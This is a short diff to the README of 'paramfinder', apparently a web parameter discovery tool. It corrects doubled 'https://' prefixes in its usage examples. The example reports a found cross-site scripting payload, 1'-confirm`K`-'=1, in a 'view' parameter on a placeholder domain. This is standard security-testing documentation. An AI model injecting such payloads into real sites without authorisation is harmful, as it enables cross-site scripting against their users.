@@ -63,8 +63,8 @@ http://testphp.vulnweb.com/guestbook.php?name=rix4uni&text=rix4uni&submit=rix4un
 
 ## Real world Example why this tool is usefull
 ```yaml
-echo "https://https://domain.com/xyz/index.php" | paramfinder --silent
-https://https://domain.com/xyz/index.php?view=rix4uni
+echo "https://domain.com/xyz/index.php" | paramfinder --silent
+https://domain.com/xyz/index.php?view=rix4uni
 ```
 ## Found xss in `view` parameter
-- https://https://domain.com/xyz/index.php?view=1'-confirm`K`-'=1
+- https://domain.com/xyz/index.php?view=1'-confirm`K`-'=1
